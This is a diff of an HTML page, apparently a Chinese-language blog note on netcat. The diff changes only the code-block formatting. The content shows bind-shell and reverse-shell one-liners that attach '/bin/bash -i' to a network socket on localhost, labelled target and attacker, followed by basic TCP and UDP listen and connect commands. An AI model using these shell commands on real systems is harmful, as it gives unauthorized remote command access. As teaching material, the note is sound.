@@ -52,56 +52,28 @@ if (!doNotTrack) {
         <time datetime="2019-10-26 16:01:06 &#43;0800 CST">Sat, 2019 Oct 26</time>
     </div> 
     <h2 id="bind-shell">Bind Shell</h2>
-
 <p>目標</p>
-
-<pre><code class="language-bash">nc -l -p 1234 -e &quot;/bin/bash -i&quot;
-</code></pre>
-
-<p>攻擊者</p>
-
-<pre><code class="language-bash">nc 127.0.0.1 1234 
-</code></pre>
-
-<h2 id="reverse-shell">Reverse Shell</h2>
-
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">nc -l -p <span style="color:#ae81ff">1234</span> -e <span style="color:#e6db74">&#34;/bin/bash -i&#34;</span>
+</code></pre></div><p>攻擊者</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">nc 127.0.0.1 <span style="color:#ae81ff">1234</span> 
+</code></pre></div><h2 id="reverse-shell">Reverse Shell</h2>
 <p>目標</p>
-
-<pre><code class="language-bash">nc 127.0.0.1 4321 -e &quot;/bin/bash -i&quot; 
-</code></pre>
-
-<p>攻擊者</p>
-
-<pre><code class="language-bash">nc -l -p 4321
-</code></pre>
-
-<h2 id="tcp">TCP</h2>
-
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">nc 127.0.0.1 <span style="color:#ae81ff">4321</span> -e <span style="color:#e6db74">&#34;/bin/bash -i&#34;</span> 
+</code></pre></div><p>攻擊者</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">nc -l -p <span style="color:#ae81ff">4321</span>
+</code></pre></div><h2 id="tcp">TCP</h2>
 <p>監聽</p>
-
-<pre><code class="language-bash">nc -l -p 1234  
-</code></pre>
-
-<p>連線</p>
-
-<pre><code class="language-bash">nc localhost 1234
-</code></pre>
-
-<h2 id="udp">UDP</h2>
-
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">nc -l -p <span style="color:#ae81ff">1234</span>  
+</code></pre></div><p>連線</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">nc localhost <span style="color:#ae81ff">1234</span>
+</code></pre></div><h2 id="udp">UDP</h2>
 <p>監聽</p>
-
-<pre><code class="language-bash">nc -u -l -p 1234  
-</code></pre>
-
-<p>連線</p>
-
-<pre><code class="language-bash">nc -u localhost 1234
-</code></pre>
-
-<h2 id="基本概念">基本概念</h2>
-
-<p>若透過<code>nc</code>的TCP模式連上未開啟tcp伺服器則會無法連線，透過udp連上未開啟的udp伺服器在<strong>送出</strong>的時候才會報錯，。</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">nc -u -l -p <span style="color:#ae81ff">1234</span>  
+</code></pre></div><p>連線</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">nc -u localhost <span style="color:#ae81ff">1234</span>
+</code></pre></div><h2 id="heading">基本概念</h2>
+<p>若透過<code>nc</code>的TCP模式連上未開啟tcp伺服器則會無法連線，
+透過udp連上未開啟的udp伺服器在<strong>送出</strong>的時候才會報錯，。</p>
 
     
       <hr>
